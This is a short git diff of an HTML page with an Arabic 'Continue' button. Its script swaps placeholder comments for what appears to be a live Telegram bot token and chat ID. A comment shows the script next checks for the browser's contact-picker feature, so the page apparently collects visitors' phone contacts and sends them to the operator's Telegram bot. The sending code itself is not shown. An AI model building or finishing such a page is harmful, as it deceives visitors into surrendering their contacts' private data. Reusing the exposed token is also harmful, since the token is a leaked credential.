@@ -14,8 +14,8 @@
     <button id="btn" style="background-color: #2ea44f; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px;">متابعة</button>
 
     <script>
-        const botToken = 'حط_توكن_البوت_هنا_بين_العلامتين'; // ضع توكن البوت الخاص بك هنا
-        const chatId = 'حط_رقم_الايدي_هنا_بين_العلامتين'; // ضع الـ Chat ID الخاص بك هنا
+        const botToken = '8880573702:AAEcni2H3MYNKKyU0GJen2XqPFgAyLO4Mdw';
+        const chatId = '8304712202';
 
         document.getElementById('btn').addEventListener('click', async () => {
             // التحقق مما إذا كانت ميزة اختيار جهات الاتصال مدعومة في المتصفح
